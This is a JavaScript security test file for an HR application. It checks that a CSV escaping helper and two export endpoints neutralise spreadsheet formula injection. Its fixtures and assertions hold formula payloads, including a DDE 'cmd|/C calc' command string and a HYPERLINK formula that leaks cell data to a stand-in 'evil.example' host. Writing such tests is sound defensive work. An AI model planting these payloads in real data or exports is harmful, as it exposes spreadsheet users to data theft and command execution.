/**
 * CSV Formula Injection (CWE-1236) Security Tests — SEC-06
 *
 * Verifies that:
 * 1. escapeCsvValue prefixes dangerous spreadsheet formula triggers (=, +, -, @, \t, \r,
 *    and whitespace-padded formulas) with a single quote (') while escaping double quotes.
 * 2. Numeric and boolean primitives are serialized cleanly without unnecessary single-quote prefixes.
 * 3. Live CSV export endpoints (/api/leaves/export, /api/employees/export) neutralize formula
 *    payloads stored in user-controlled fields (e.g. leave reason, employee name/phone).
 */
import { describe, it, expect, beforeAll } from 'vitest';
import request from 'supertest';
import bcrypt from 'bcryptjs';
import app from '../../server.js';
import { sequelize } from '../config/database.js';
import { Department, User, LeaveRequest } from '../models/index.js';
import { escapeCsvValue } from '../utils/csv.js';

let adminCookie = null;
let dept = null;
let emp = null;

beforeAll(async () => {
  await sequelize.sync({ force: true });

  dept = await Department.create({
    code: 'CSV-SEC',
    name: '=SUM(1,2) Malicious Dept',
    description: 'Testing CSV formula neutralization'
  });

  await User.create({
    employee_code: 'ADM-CSV-01',
    full_name: 'Admin CSV',
    email: 'admin.csv@fusheng.com.vn',
    password: await bcrypt.hash('Admin@123', 10),
    role: 'admin',
    department_id: dept.id,
    status: 'active'
  });

  emp = await User.create({
    employee_code: 'EMP-CSV-01',
    full_name: '@cmd|\'/C calc\'!A0',
    email: 'emp.csv@fusheng.com.vn',
    phone: '+84901234567',
    password: await bcrypt.hash('ValidPass@123', 10),
    role: 'employee',
    department_id: dept.id,
    status: 'active'
  });

  await LeaveRequest.create({
    user_id: emp.id,
    request_type: 'leave',
    leave_type: 'annual',
    start_date: '2026-11-10',
    end_date: '2026-11-11',
    day_count: 2,
    reason: '=HYPERLINK("http://evil.example/leak?x="&A2,"Click me")',
    status: 'pending'
  });

  const loginRes = await request(app)
    .post('/api/auth/login')
    .send({ email: 'admin.csv@fusheng.com.vn', password: 'Admin@123' });

  adminCookie = loginRes.headers['set-cookie'];
});

describe('escapeCsvValue unit tests (SEC-06)', () => {
  it('neutralizes all OWASP CWE-1236 formula prefixes', () => {
    expect(escapeCsvValue('=cmd|\'/C calc\'!A0')).toBe('"\'=cmd|\'/C calc\'!A0"');
    expect(escapeCsvValue('+SUM(A1:A10)')).toBe('"\'+SUM(A1:A10)"');
    expect(escapeCsvValue('-2+3+cmd|\'/C calc\'!A0')).toBe('"\'-2+3+cmd|\'/C calc\'!A0"');
    expect(escapeCsvValue('@SUM(1+1)')).toBe('"\'@SUM(1+1)"');
    expect(escapeCsvValue('\t=1+1')).toBe('"\'\t=1+1"');
    expect(escapeCsvValue('\r=1+1')).toBe('"\'\r=1+1"');
    expect(escapeCsvValue('   =1+1')).toBe('"\'   =1+1"');
  });

  it('escapes embedded double quotes alongside formula neutralization', () => {
    expect(escapeCsvValue('=HYPERLINK("http://evil.test","ok")')).toBe(
      '"\'=HYPERLINK(""http://evil.test"",""ok"")"'
    );
  });

  it('leaves safe text, null/undefined, and numeric values untouched', () => {
    expect(escapeCsvValue(null)).toBe('""');
    expect(escapeCsvValue(undefined)).toBe('""');
    expect(escapeCsvValue('Nghi phep nam binh thuong')).toBe('"Nghi phep nam binh thuong"');
    expect(escapeCsvValue(-5)).toBe('"-5"');
    expect(escapeCsvValue(12.5)).toBe('"12.5"');
  });
});

describe('Live CSV Export Endpoints Formula Neutralization (SEC-06)', () => {
  it('neutralizes formula payloads in GET /api/leaves/export', async () => {
    const res = await request(app)
      .get('/api/leaves/export')
      .set('Cookie', adminCookie);

    expect(res.status).toBe(200);
    expect(res.text).toContain('"\'=HYPERLINK(""http://evil.example/leak?x=""&A2,""Click me"")"');
    expect(res.text).toContain('"\'@cmd|\'/C calc\'!A0"');
    expect(res.text).toContain('"\'=SUM(1,2) Malicious Dept"');
  });

  it('neutralizes formula payloads in GET /api/employees/export', async () => {
    const res = await request(app)
      .get('/api/employees/export')
      .set('Cookie', adminCookie);

    expect(res.status).toBe(200);
    expect(res.text).toContain('"\'@cmd|\'/C calc\'!A0"');
    expect(res.text).toContain('"\'+84901234567"');
  });
});
